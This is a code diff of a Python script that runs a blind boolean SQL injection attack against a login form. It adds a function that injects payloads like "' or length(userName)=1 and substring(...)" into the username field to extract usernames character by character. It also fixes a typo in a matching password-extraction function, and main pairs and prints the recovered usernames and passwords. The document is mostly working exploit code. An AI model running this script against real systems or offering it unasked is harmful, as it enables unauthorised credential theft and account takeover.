@@ -125,8 +125,34 @@ def getUsersOptomized():
 
 
     return done
+def getUsersBetter(max_length):
+    partial = []
+    done = []
 
-def getPasswords(max_lenght):
+    for i in iter.chain(range(48,58), range(97, 123)):
+        params = {'userName': "' or length(username)=1 and substring(userName, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '", 'password': ''}
+        if get_answer(params):
+            done.append(str(chr(i)))
+        params = {'userName': "' or length(username)!=1 and substring(userName, 1, 1)=" + '\"' + str(chr(i)) + '\"' + " -- '", 'password': ''}
+        if get_answer(params):
+            partial.append(str(chr(i)))
+        
+    
+    for x in range(1, max_length + 1):
+        for word in partial:
+            for i in iter.chain(range(48,58), range(97, 123)):
+                params = {'userName': "' or length(userName)!=" + str(x) + " and substring(userName, 1, " + str(x) + ")=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
+                if get_answer(params):
+                    partial.append(word + str(chr(i)))
+                params = {'userName': "' or length(userName)=" + str(x) + " and substring(userName, 1, " + str(x) + ")=" + '\"' + word + str(chr(i)) + '\"' + " -- '", 'password': ''}
+                if get_answer(params):
+                    if str(word + str(chr(i))) not in done:
+                        done.append(word + str(chr(i)))
+                
+                    #print(word + str(chr(i)))
+
+    return done
+def getPasswords(max_length):
     partial = []
     done = []
     
@@ -139,7 +165,7 @@ def getPasswords(max_lenght):
         if get_answer(params):
             partial.append(str(chr(i)))
 
-    for x in range(1, max_lenght + 1):
+    for x in range(1, max_length + 1):
         for word in partial:
             for i in iter.chain(range(48,58), range(97, 123)):
                 params = {'username': '', 'password': "' or length(password)="+ str(x) + " and substring(password, 1, " + str(x) + " )=" + '\"' + word + str(chr(i)) + '\"' + " -- '"}
@@ -160,7 +186,9 @@ def matchPasswords(users, passwords):
                 if get_answer(params):
                     print(user, ": ", password) 
 def main():
-    users = getUsersOptomized()
+    #users = getUsersOptomized()
+    users = getUsersBetter(8)
+    #print( users )
     passwords = getPasswords(8)
     matchPasswords(users, passwords)
 main()
